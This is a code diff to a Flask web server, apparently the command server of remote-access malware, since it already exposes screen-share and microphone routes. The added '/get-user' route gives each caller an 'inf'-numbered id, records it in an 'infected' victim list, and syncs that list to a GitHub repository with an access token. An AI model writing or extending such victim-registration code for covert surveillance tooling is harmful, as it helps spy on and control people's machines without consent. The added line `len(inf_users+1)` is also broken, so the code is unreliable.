@@ -829,5 +829,31 @@ def screenshare():
 @app.route("/audiomic",methods=["GET"])
 def audiomic():
      return render_template("audio.html")
+
+@app.route("/get-user",methods=["GET"])
+def get_user():
+    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
+        target = json.load(file)
+    inf_users = target["infected"]
+    user = f"inf{len(inf_users+1)}"
+    target["infected"].append(user)
+    target["users"].append(user)
+    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
+        json.dump(target, file, indent=4)
+    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{STATIC_FOLDER}/users.json"
+    headers = {
+            "Authorization": f"token {token}",
+            "Accept": "application/vnd.github.v3+json"
+        }				
+    data = {
+            "message": commit_message,
+            "content": base64.b64encode(json.dumps(target).encode()).decode(),
+            "branch": branch
+        }				
+    response = rq.put(url, json=data, headers=headers)				
+    if response.status_code == 201:
+        print("user successfully added")
+
+    return user    
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
